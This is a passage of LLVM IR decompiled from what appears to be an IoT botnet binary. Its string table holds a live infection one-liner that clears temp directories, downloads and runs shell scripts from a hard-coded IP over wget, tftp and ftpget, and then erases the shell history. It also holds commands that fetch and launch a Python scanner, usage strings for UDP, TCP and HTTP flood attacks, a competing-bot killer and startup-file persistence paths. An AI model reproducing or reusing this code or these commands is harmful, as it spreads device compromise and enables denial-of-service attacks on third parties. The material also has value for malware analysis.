0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_21950.792, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_219c8.793, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_21a24.794, i32 0, i32 0), i8* getelementptr inbounds ([95 x i8], [95 x i8]* @global_var_21a88.795, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_21ae8.796, i32 0, i32 0), i8* getelementptr inbounds ([66 x i8], [66 x i8]* @global_var_21b40.797, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_202b4.730, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_22538.820, i32 0, i32 0), i8* getelementptr inbounds ([77 x i8], [77 x i8]* @global_var_21b84.798, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @global_var_22580.821, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @global_var_21bd4.799, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_21c58.800, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_20948.746, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_20d70.758, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_21cac.801, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_21d1c.802, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_210d8.768, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_21db4.803, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_22608.822, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_22654.823, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_2266c.824, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_226e0.825, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @global_var_22754.826, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_21e00.804, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_21e80.805, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_21f00.806, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_21f80.807, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_22000.808, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_22080.809, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_22100.810, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_22178.811, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_221e4.812, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @global_var_22258.813, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @global_var_222d8.814, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1be44.526, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_20a48.749, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_22314.815, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_2235c.816, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_20714.741, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @global_var_223a0.817, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_22470.818, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_20090.724, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_224cc.819, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_203e8.733, i32 0, i32 0)]
@global_var_1bddc.829 = constant [6 x i8] c"close\00"
@global_var_1bde4.830 = constant [11 x i8] c"keep-alive\00"
@global_var_1bdf0.831 = constant [7 x i8] c"accept\00"
@global_var_1bdf8.832 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bddc.829, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1bde4.830, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bdf0.831, i32 0, i32 0)]
@global_var_231e8.836 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_23228.838 = constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://45.32.213.61/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 45.32.213.61 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 45.32.213.61; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.213.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00"
@global_var_233e0.840 = constant [4 x i8] c"%d\0A\00"
@global_var_233e4.842 = constant [7 x i8] c"PYTHON\00"
@global_var_233ec.844 = constant [8 x i8] c"INSTALL\00"
@global_var_233f4.846 = constant [130 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 45.32.213.61/good2.py\00"
@global_var_23478.849 = constant [26 x i8] c"INSTALLING PYTHON SCANNER\00"
@global_var_23494.851 = constant [7 x i8] c"UPDATE\00"
@global_var_2349c.853 = constant [47 x i8] c"cd /.tmp;rm -rf *py;wget 45.32.213.61/good2.py\00"
@global_var_234cc.855 = constant [24 x i8] c"UPDATING PYTHON SCANNER\00"
@global_var_234e4.857 = constant [4 x i8] c"OFF\00"
@global_var_234e8.859 = constant [31 x i8] c"killall -9 python;pkill python\00"
@global_var_23508.861 = constant [24 x i8] c"STOPPING PYTHON SCANNER\00"
@global_var_23520.863 = constant [6 x i8] c"START\00"
@global_var_23528.865 = constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00"
@global_var_23550.867 = constant [28 x i8] c"STARTING VOIDS HACKA SCANNA\00"
@global_var_2356c.870 = constant [6 x i8] c"PONG!\00"
@global_var_23574.872 = constant [6 x i8] c"TABLE\00"
@global_var_2357c.874 = constant [3 x i8] c"%d\00"
@global_var_23580.876 = constant [25 x i8] c"UPDATE TAKEN SUCCESFULLY\00"
@global_var_2359c.878 = constant [8 x i8] c"SCANNER\00"
@global_var_33888.880 = global i32 0
@global_var_235a4.882 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_235b8.884 = constant [3 x i8] c"ON\00"
@global_var_235bc.887 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_235d8.889 = constant [6 x i8] c"NETIS\00"
@global_var_235e0.891 = constant [23 x i8] c"STOPPING NETIS SCANNER\00"
@global_var_235f8.893 = constant [23 x i8] c"STARTING NETIS SCANNER\00"
@global_var_23610.895 = constant [8 x i8] c"REMOVER\00"
@global_var_23618.897 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_23638.899 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_23644.901 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_23658.903 = constant [4 x i8] c"UDP\00"
@global_var_2365c.905 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_236d0.908 = constant [4 x i8] c"TCP\00"
@global_var_236d4.910 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_23790.912 = constant [5 x i8] c"HTTP\00"
@global_var_23798.914 = constant [4 x i8] c"CNC\00"
@global_var_2379c.916 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_237b8.918 = constant [4 x i8] c"STD\00"
@global_var_237bc.920 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_237d8.922 = constant [9 x i8] c"KILLATTK\00"
@global_var_237e4.927 = constant [11 x i8] c"Killed %d.\00"
@global_var_237f0.929 = constant [13 x i8] c"None Killed.\00"
@global_var_23800.931 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_2d180.934 = local_unnamed_addr global i32 -1
@global_var_2d17c.936 = global [17 x i8]* @global_var_1ac28.505
@global_var_2380c.938 = constant [8 x i8] c"8.8.8.8\00"
@global_var_23814.941 = constant [16 x i8] c"/proc/net/route\00"
@global_var_23824.943 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2d614.945 = global i32 0
@global_var_23830.947 = constant [7 x i8] c"Device\00"
@global_var_23838.949 = constant i32 0
@global_var_2383c.951 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_23854.955 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_23864.957 = constant i32 47
@global_var_23868.959 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_23870.961 = constant i32 97
@global_var_23874.963 = constant [13 x i8] c"fork failed\0A\00"
@global_var_23884.967 = constant [16 x i8] c"Connected %s:%s\00"
@global_var_23894.972 = constant [5 x i8] c"PONG\00"
@global_var_2389c.974 = constant [4 x i8] c"DUP\00"
@global_var_238a0.976 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_238b4.978 = constant [3 x i8] c"SH\00"
@global_var_238b8.980 = constant [8 x i8] c"%s 2>&1\00"
@global_var_238c0.982 = constant [3 x i8] c"%s\00"
@global_var_238c4.984 = constant i32 32
@global_var_33848.986 = global i32 0
@global_var_2d288 = external global i32
@global_var_2d290 = external local_unnamed_addr global i32
@global_var_33858.996 = global i32 0
@global_var_2d2c4.1002 = global i32 0
@global_var_31624.1004 = global i32 0
@global_var_14ed0.1006 = constant i32 -481296384
@global_var_122dc.1007 = constant i32 -442564544
@global_var_31628.1009 = global i32 0
@global_var_20003.1013 = constant [28 x i8] c"e/19.0.1084.56 Safari/536.5\00"
@global_var_20000.1014 = constant [31 x i8] c"rome/19.0.1084.56 Safari/536.5\00"
@global_var_2d2dc.1017 = global i32 2
@global_var_2d2ac.1023 = global i32 0
@global_var_126d0.1024 = constant i32 -442564492
@global_var_2d2a8.1026 = global i32* bitcast (i8** @global_var_2d2e0.991 to i32*)
@global_var_23ec8.1032 = constant i32 0
@global_var_12890.1037 = constant i32 -382910448
@global_var_166b8.1038 = constant i32 -382909968
@global_var_16774.1043 = constant i32 -382910224
@global_var_23efc.1045 = constant i32 135270416
@global_var_23ee0.1047 = constant [6 x i8] c"(nil)\00"
@global_var_23ee8.1050 = constant [7 x i8] c"(null)\00"
@global_var_23ef0.1052 = constant i32 2949163
@global_var_23f7c.1055 = constant i32 16843008
@global_var_23f64.1057 = constant i32 327688
@global_var_23f5c.1062 = constant [8 x i8] c" +0-#'I\00"
@global_var_23f04.1064 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_23f44.1066 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_23f37.1068 = constant i32 117506048
@global_var_23f38.1070 = constant i32 252117248
@global_var_23f28.1072 = constant i32 331776
@global_var_23f18.1074 = constant i32 335616
@global_var_13e9c.1106 = constant i32 -456978431
@global_var_23f98.1112 = constant [8 x i8] c"Success\00"
@global_var_23f88.1114 = constant [15 x i8] c"Unknown error \00"
@global_var_24c36.1117 = constant i32 65536
@global_var_2d5c4.1118 = global i32* @global_var_24c36.1117
@global_var_3362c.1121 = global i32 0
@global_var_33630.1124 = global i32 0
@global_var_3380c.1126 = global i32 0
@global_var_33640.1128 = global i32 0
@global_var_2d5cc.1130 = global i32 0
@global_var_33944.1135 = global i32 0
@global_var_33938.1138 = global i32 0
@global_var_33890.1140 = global i32 0
@global_var_33820.1142 = global i32 0
@global_var_2d4cc.1145 = global i32 256
@global_var_2d3d0.1146 = global i32* @global_var_2d4cc.1145
@global_var_33910.1150 = global i32 0
@global_var_164fc.1151 = constant i32 -382910416
@global_var_14f50.1158 = constant i32 -442564520
@global_var_2d4d8.1164 = global i32 0
@global_var_120a8.1166 = constant i32 -481230848
@global_var_33838.1168 = global i32 0
@global_var_11c94.1170 = constant i32 -509587456
@global_var_2d4f0.1172 = global i32 0
@global_var_2d508 = external global i32
@global_var_2d528.1178 = global i32 -1726662223
@global_var_2d510.1185 = local_unnamed_addr global i32* @global_var_2d528.1178
@global_var_2d50c.1187 = global i32* @global_var_2d528.1178
@global_var_24af4.1201 = constant i32 0
@global_var_1f31d.1205 = constant [54 x i8] c"compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_24b1c.1209 = constant [8 x i8] c"/bin/sh\00"
@global_var_24b24.1211 = constant [3 x i8] c"sh\00"
@global_var_24b28.1213 = constant [3 x i8] c"-c\00"
@global_var_2d5a4.1217 = global i32 0
@global_var_3383c.1221 = local_unnamed_addr global i32 0
@global_var_127d8.1224 = constant i32 -382910416
@global_var_33844.1226 = global i32 0
@global_var_2d000.1230 = global i32 -1
@global_var_3384c.1233 = global i32 0
@global_var_33850.1235 = local_unnamed_addr global i32 0
@global_var_15fc0.1236 = constant i32 -390234096
@global_var_24b2c.1238 = constant [10 x i8] c"/dev/null\00"
@global_var_33854.1240 = global i32 0
@global_var_12758.1244 = constant i32 -382909968
@global_var_33840.1246 = local_unnamed_addr global i32 0
@global_var_13e10.1249 = constant i32 -369095250
@global_var_2d5bc = external local_unnamed_addr global i32
@global_var_121a8.1260 = constant i32 -442564608
@global_var_16288.1262 = constant i32 -335544720
@global_var_163c0.1265 = constant i32 -275775369
@global_var_3387c.1267 = global i32 0
@global_var_3385c.1269 = global i32 0
@global_var_24e38.1273 = constant [4 x i8] c"inf\00"
@global_var_24e4c.1276 = constant i32 1076101120
@global_var_24e3b.1281 = constant i32 1179535616
@global_var_24e48.1283 = constant i32 2883630
@global_var_13aa0.1285 = constant i32 -382908944
@global_var_33860.1293 = global i32 0
@global_var_33878.1298 = local_unnamed_addr global i32 0
@global_var_11ce8.1303 = constant i32 -382910448
@global_var_33948.1306 = global i32 0
@global_var_24e94.1308 = constant i32 46
@global_var_33928.1310 = global i32 0
@global_var_18354.1312 = constant i32 -369098656
@global_var_24e98.1319 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_24eac.1321 = constant i32 114
@global_var_24eb0.1323 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_24ec8.1326 = constant [11 x i8] c"nameserver\00"
@global_var_24ed4.1329 = constant [7 x i8] c"domain\00"
@global_var_24edc.1331 = constant [7 x i8] c"search\00"
@global_var_3394c.1336 = global i32 0
@global_var_33950.1338 = global i32 0
@global_var_24ef8.1347 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_24ee4.1349 = constant i32 0
@global_var_24f0c.1352 = constant [3 x i8] c"%x\00"
@global_var_24f10.1355 = constant [11 x i8] c"/etc/hosts\00"
@global_var_24f1c.1357 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1a128.1360 = constant i32 -504313148
@global_var_1a110.1361 = constant i32 -483131392
@global_var_19fd0.1362 = constant i32 -481294847
@global_var_1a188.1363 = constant i32 -477821825
@global_var_1a288.1364 = constant i32 -476034303
@global_var_1a574.1365 = constant i32 -516685812
@global_var_1a478.1366 = constant i32 -905969576
@global_var_1a5f4.1367 = constant i32 -478149505
@global_var_1a5dc.1368 = constant i32 -534773758
@global_var_1a590.1369 = constant i32 -534773758
@global_var_1a528.1370 = constant i32 -483131392
@global_var_2d004.1372 = global i32 0
@global_var_2d5e8.6 = external global i8*
@global_var_2d61a.80 = external global i8*
@global_var_2d61b.81 = local_unnamed_addr global i8 0
@global_var_2d61c.82 = local_unnamed_addr global i8 0
@global_var_2d61d.83 = local_unnamed_addr global i8 0
@global_var_2d61e.84 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_2d2e0.991 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_2d330.992 = local_unnamed_addr global i8 16
@global_var_15fd4.998 = constant i8 0
@global_var_2d2e1.1029 = local_unnamed_addr global i8 1
@global_var_2d331.1030 = local_unnamed_addr global i8 1
@3 = internal constant [2 x i8] c"\01\00"
@global_var_2d5c8.1300 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_2d5c9.1301 = local_unnamed_addr global i8 0
@global_var_23850.953 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2d5e8.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2d5e8.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2d01c.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2d01c.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2d01c.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2d01c.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2d5e8.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2d01c.9, { 1, 0 }
  uselistorder i8** @global_var_2d5e8.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_2d010.19, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2d010.19 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2d010.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2d010.19, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_10be0.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 108988, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_2d620.26, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_2d624.27, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_2d628.28, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2d620.26 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_2d620.26 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_2d620.26 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_2d280.31, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_2d280.31, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_2d620.26 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_2d27c.34, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_2d27c.34, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_2d620.26 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_2d620.26, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2d620.26 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c11 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c11, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.012, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.012 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.012
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
